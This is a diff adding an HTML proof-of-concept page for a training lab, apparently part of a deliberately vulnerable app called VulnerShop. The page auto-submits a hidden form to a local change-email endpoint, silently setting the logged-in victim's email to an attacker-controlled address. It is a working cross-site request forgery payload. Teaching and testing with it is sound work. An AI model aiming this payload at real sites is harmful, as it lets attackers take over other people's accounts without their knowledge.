@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>CSRF PoC - change email (training lab only)</title></head>
+<body>
+<h1>CSRF proof-of-concept</h1>
+<p>
+    This page demonstrates the CSRF vulnerability in VulnerShop's
+    <code>/account/change-email</code> endpoint (see INSTRUCTOR_GUIDE.md, finding #7).
+    Open this file directly in a browser <strong>while logged into VulnerShop in another
+    tab on the same browser</strong>, running at http://127.0.0.1:5000. The form below
+    auto-submits and silently changes the logged-in victim's email address.
+</p>
+<p><strong>Training use only — target only your own local VulnerShop instance.</strong></p>
+
+<form action="http://127.0.0.1:5000/account/change-email" method="POST" id="csrf-form">
+    <input type="hidden" name="email" value="csrf-poc@attacker.example">
+</form>
+<script>
+    document.getElementById("csrf-form").submit();
+</script>
+</body>
+</html>
